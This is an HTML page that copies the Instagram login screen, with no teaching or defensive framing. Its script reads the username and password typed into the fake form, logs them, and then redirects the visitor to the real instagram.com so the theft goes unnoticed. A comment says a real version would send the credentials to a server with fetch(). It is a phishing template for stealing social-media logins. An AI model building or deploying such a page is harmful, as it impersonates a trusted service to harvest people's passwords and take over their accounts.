<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <style>
        /* Simple styling to match your layout */
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #wrapper { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo h1 { font-family: 'Cookie', cursive; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        .form-btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .has-separator { display: block; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .facebook-login { color: #385185; text-decoration: none; font-weight: bold; display: block; margin-bottom: 15px; }
        .password-reset { font-size: 12px; color: #00376b; text-decoration: none; }
    </style>
</head>
<body>

    <div id="wrapper">
        <div class="logo">
            <h1>Instagram</h1>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button class="form-btn" type="submit">Log in</button>
            
            <span class="has-separator">OR</span>
            
            <a href="#" class="facebook-login">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Stop the page from refreshing

            // 1. GET THE DATA
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // 2. "SAVE" THE DATA 
            // NOTE: In a real app, you would use fetch() to send this to a database/server.
            // For this example, we will just log it to the browser console.
            console.log("Saving Data...");
            console.log("Username: " + user);
            console.log("Password: " + pass);

            // 3. REDIRECT TO INSTAGRAM
            // This attempts to open the app; if it fails, it opens the browser link.
            const instagramUrl = "https://www.instagram.com";
            
            // Redirect immediately
            window.location.href = instagramUrl;
        });
    </script>

</body>
</html>
